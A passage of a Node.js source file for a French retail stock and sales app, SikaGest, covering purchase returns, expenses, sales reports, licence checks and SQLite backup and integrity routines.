          const line = q.get('SELECT * FROM purchase_items WHERE id=? AND purchase_id=?', it.item_id, id) || fail('Ligne introuvable.');
          if (qty > line.qty - line.returned_qty) fail(`Retour trop élevé pour « ${line.name} ».`);
          const prod = q.get('SELECT stock,name FROM products WHERE id=?', line.product_id);
          if (prod && prod.stock < qty) fail(`Stock insuffisant pour retourner « ${prod.name} ».`);
          q.run('UPDATE purchase_items SET returned_qty = returned_qty + ? WHERE id=?', qty, line.id);
          moveStock(line.product_id, -qty, 'retour_achat', p.ref, note);
          total += qty * line.cost;
        }
        if (total <= 0) fail('Indiquez au moins une quantité à retourner.');
        total = round(total);
        q.run('INSERT INTO returns(kind,doc_id,date,total,note,user_id) VALUES(?,?,?,?,?,?)', 'achat', id, now(), total, note, u.id);
        const returned = round(p.returned + total);
        const net = round(p.total - returned);
        let paid = p.paid;
        if (paid > net) {
          q.run('INSERT INTO payments(kind,doc_id,amount,method,date,user_id) VALUES(?,?,?,?,?,?)', 'achat', id, -(paid - net), 'Remboursement fournisseur', now(), u.id);
          paid = net;
        }
        q.run('UPDATE purchases SET returned=?, paid=?, status=? WHERE id=?', returned, paid, statusOf(net, paid), id);
        return api['purchases.get']({ id });
      });
    },
    'purchases.cancel'({ id }) {
      needAdmin();
      return tx(() => {
        const p = q.get('SELECT * FROM purchases WHERE id=?', id) || fail('Achat introuvable.');
        if (p.cancelled) fail('Achat déjà annulé.');
        for (const l of q.all('SELECT * FROM purchase_items WHERE purchase_id=?', id)) {
          const back = l.qty - l.returned_qty;
          if (back > 0) moveStock(l.product_id, -back, 'annulation_achat', p.ref);
        }
        q.run('UPDATE purchases SET cancelled=1 WHERE id=?', id);
        return true;
      });
    },

    // ---------- Dépenses ----------
    'expenses.list'({ from = null, to = null } = {}) {
      needUser();
      let sql = 'SELECT e.*, u.name AS user FROM expenses e LEFT JOIN users u ON u.id=e.user_id WHERE 1=1';
      const a = [];
      if (from) { sql += ' AND date(e.date) >= date(?)'; a.push(from); }
      if (to) { sql += ' AND date(e.date) <= date(?)'; a.push(to); }
      return q.all(sql + ' ORDER BY e.date DESC, e.id DESC', ...a);
    },
    'expenses.save'(e) {
      const u = needUser();
      if (!(num(e.amount) > 0)) fail('Montant invalide.');
      const vals = [e.date || now().slice(0, 10), e.category || 'Divers', round(e.amount), e.note || ''];
      if (e.id) { needAdmin(); q.run('UPDATE expenses SET date=?,category=?,amount=?,note=? WHERE id=?', ...vals, e.id); return e.id; }
      return Number(q.run('INSERT INTO expenses(date,category,amount,note,user_id) VALUES(?,?,?,?,?)', ...vals, u.id).lastInsertRowid);
    },
    'expenses.delete'({ id }) { needAdmin(); q.run('DELETE FROM expenses WHERE id=?', id); return true; },

    // ---------- Tableau de bord & rapports ----------
    'reports.summary'({ from = null, to = null } = {}) {
      needUser();
      const f = from || '0000-01-01', t = to || '9999-12-31';
      const s = q.get(`SELECT IFNULL(SUM(total),0) AS total, IFNULL(SUM(returned),0) AS returned, IFNULL(SUM(paid),0) AS paid,
        IFNULL(SUM(total-returned-paid),0) AS due, COUNT(*) AS n FROM sales WHERE cancelled=0 AND date(date) BETWEEN date(?) AND date(?)`, f, t);
      const p = q.get(`SELECT IFNULL(SUM(total),0) AS total, IFNULL(SUM(returned),0) AS returned, IFNULL(SUM(paid),0) AS paid,
        IFNULL(SUM(total-returned-paid),0) AS due, COUNT(*) AS n FROM purchases WHERE cancelled=0 AND date(date) BETWEEN date(?) AND date(?)`, f, t);
      const cost = q.get(`SELECT IFNULL(SUM((i.qty-i.returned_qty)*i.cost),0) AS c FROM sale_items i JOIN sales s ON s.id=i.sale_id
        WHERE s.cancelled=0 AND date(s.date) BETWEEN date(?) AND date(?)`, f, t).c;
      const exp = q.get('SELECT IFNULL(SUM(amount),0) AS e FROM expenses WHERE date(date) BETWEEN date(?) AND date(?)', f, t).e;
      const netSales = round(s.total - s.returned);
      const grossProfit = round(netSales - cost);
      return {
        sales: { ...s, net: netSales }, purchases: { ...p, net: round(p.total - p.returned) },
        cost: round(cost), grossProfit, expenses: round(exp), netProfit: round(grossProfit - exp),
        stockValue: q.get('SELECT IFNULL(SUM(stock*cost_price),0) AS v FROM products WHERE active=1').v,
        lowStock: q.get('SELECT COUNT(*) AS n FROM products WHERE active=1 AND stock <= alert_qty').n,
        products: q.get('SELECT COUNT(*) AS n FROM products WHERE active=1').n,
        clients: q.get("SELECT COUNT(*) AS n FROM contacts WHERE active=1 AND type='client'").n,
      };
    },
    'reports.daily'({ days = 30 } = {}) {
      needUser();
      const rows = q.all(`SELECT date(date) AS d, SUM(total-returned) AS sales FROM sales WHERE cancelled=0
        AND date(date) > date('now','localtime', ?) GROUP BY date(date)`, `-${days} days`);
      const prow = q.all(`SELECT date(date) AS d, SUM(total-returned) AS purchases FROM purchases WHERE cancelled=0
        AND date(date) > date('now','localtime', ?) GROUP BY date(date)`, `-${days} days`);
      const map = {};
      for (const r of rows) map[r.d] = { sales: r.sales, purchases: 0 };
      for (const r of prow) (map[r.d] = map[r.d] || { sales: 0, purchases: 0 }).purchases = r.purchases;
      const out = [];
      const d = new Date();
      for (let i = days - 1; i >= 0; i--) {
        const x = new Date(d.getFullYear(), d.getMonth(), d.getDate() - i);
        const k = `${x.getFullYear()}-${String(x.getMonth() + 1).padStart(2, '0')}-${String(x.getDate()).padStart(2, '0')}`;
        out.push({ date: k, sales: round(map[k]?.sales || 0), purchases: round(map[k]?.purchases || 0) });
      }
      return out;
    },
    'reports.topProducts'({ from = null, to = null, limit = 10 } = {}) {
      needUser();
      return q.all(`SELECT i.product_id, i.name, SUM(i.qty-i.returned_qty) AS qty, SUM((i.qty-i.returned_qty)*i.price) AS amount,
        SUM((i.qty-i.returned_qty)*(i.price-i.cost)) AS margin
        FROM sale_items i JOIN sales s ON s.id=i.sale_id WHERE s.cancelled=0 AND date(s.date) BETWEEN date(?) AND date(?)
        GROUP BY i.product_id ORDER BY amount DESC LIMIT ?`, from || '0000-01-01', to || '9999-12-31', limit);
    },
    'reports.payments'({ from = null, to = null } = {}) {
      needUser();
      return q.all(`SELECT kind, method, SUM(amount) AS amount, COUNT(*) AS n FROM payments
        WHERE date(date) BETWEEN date(?) AND date(?) GROUP BY kind, method ORDER BY kind, amount DESC`, from || '0000-01-01', to || '9999-12-31');
    },
  };

  function call(method, args) {
    const fn = api[method];
    if (!fn) throw new AppError(`Action inconnue : ${method}`);
    if (LICENSED_ACTIONS.has(method) && licenseStatus().state === 'expired') {
      throw new AppError('LICENCE: Votre période d\'essai ou votre licence est terminée. Activez SikaGest pour continuer à enregistrer. Vos données restent consultables.');
    }
    return fn(args || {});
  }
  function close() { try { db.close(); } catch (e) { /* déjà fermé */ } }
  function checkpoint() { try { db.exec('PRAGMA wal_checkpoint(TRUNCATE)'); } catch (e) { /* rien */ } }
  // Copie cohérente de la base, même pendant l'utilisation (ventes en cours comprises)
  function snapshot(target) {
    try { fs.unlinkSync(target); } catch (e) { /* absent */ }
    db.prepare('VACUUM INTO ?').run(target);
  }
  // Contrôle rapide de la base en cours d'utilisation
  function quickCheck() {
    try { const r = db.prepare('PRAGMA quick_check').all().map((x) => Object.values(x)[0]); return r.length === 1 && r[0] === 'ok' ? 'ok' : r.slice(0, 3).join(' ; '); }
    catch (e) { return e.message; }
  }
  // Réglages internes de la sauvegarde en ligne (jamais envoyés à l'interface)
  function getPrivate(k) { if (!String(k).startsWith('cloud_')) throw new Error('clé interdite'); return setting(k); }
  function setPrivate(k, v) { if (!String(k).startsWith('cloud_')) throw new Error('clé interdite'); setSetting(k, v == null ? '' : String(v)); }
  // Après une récupération validée par le vendeur : autorise le choix d'un nouveau mot de passe
  function allowReset() { recoveryOk = true; session = null; return q.all('SELECT id,name,username,role,active FROM users ORDER BY role, name'); }
  function setVendor(v) { setSetting('vendor_json', JSON.stringify(v || {})); }
  function getVendor() { try { return JSON.parse(setting('vendor_json') || '{}'); } catch (e) { return {}; } }
  return { call, close, checkpoint, snapshot, quickCheck, getPrivate, setPrivate, allowReset, file, AppError, driver: db.__driver || 'node:sqlite', licenseStatus, setVendor, getVendor };
}

// Vérifie qu'un fichier est une base SikaGest lisible et non abîmée.
// Renvoie { ok: true, sales, products } ou { ok: false, error }.
const REQUIRED_TABLES = ['settings', 'users', 'products', 'sales', 'purchases'];
function checkFile(file, nativeBinding) {
  let db;
  try {
    if (!fs.existsSync(file)) return { ok: false, error: 'fichier introuvable' };
    const head = Buffer.alloc(16);
    const fd = fs.openSync(file, 'r');
    try { fs.readSync(fd, head, 0, 16, 0); } finally { fs.closeSync(fd); }
    if (head.toString('latin1') !== 'SQLite format 3\0') return { ok: false, error: 'ce n\'est pas une sauvegarde SikaGest' };
    db = openDriver(file, nativeBinding);
    const res = db.prepare('PRAGMA integrity_check').all().map((x) => Object.values(x)[0]);
    if (!(res.length === 1 && res[0] === 'ok')) return { ok: false, error: 'fichier abîmé' };
    const tables = new Set(db.prepare("SELECT name FROM sqlite_master WHERE type='table'").all().map((r) => r.name));
    const missing = REQUIRED_TABLES.filter((t) => !tables.has(t));
    if (missing.length) return { ok: false, error: 'ce n\'est pas une sauvegarde SikaGest' };
    const n = (t) => Number(db.prepare(`SELECT COUNT(*) AS n FROM ${t}`).get().n);
    const one = (sql) => { try { const r = db.prepare(sql).get(); return r ? Object.values(r)[0] : null; } catch (e) { return null; } };
    return { ok: true, sales: n('sales'), products: n('products'), users: n('users'),
      shop: one("SELECT value FROM settings WHERE key='company_name'"), lastSale: one('SELECT MAX(date) FROM sales') };
  } catch (e) {
    return { ok: false, error: `fichier illisible (${e.message})` };
  } finally {
    if (db) { try { db.close(); } catch (e) { /* rien */ } }
    for (const ext of ['-wal', '-shm']) { try { fs.unlinkSync(file + ext); } catch (e) { /* absent */ } }
  }
}

module.exports = { createStore, checkFile, AppError };
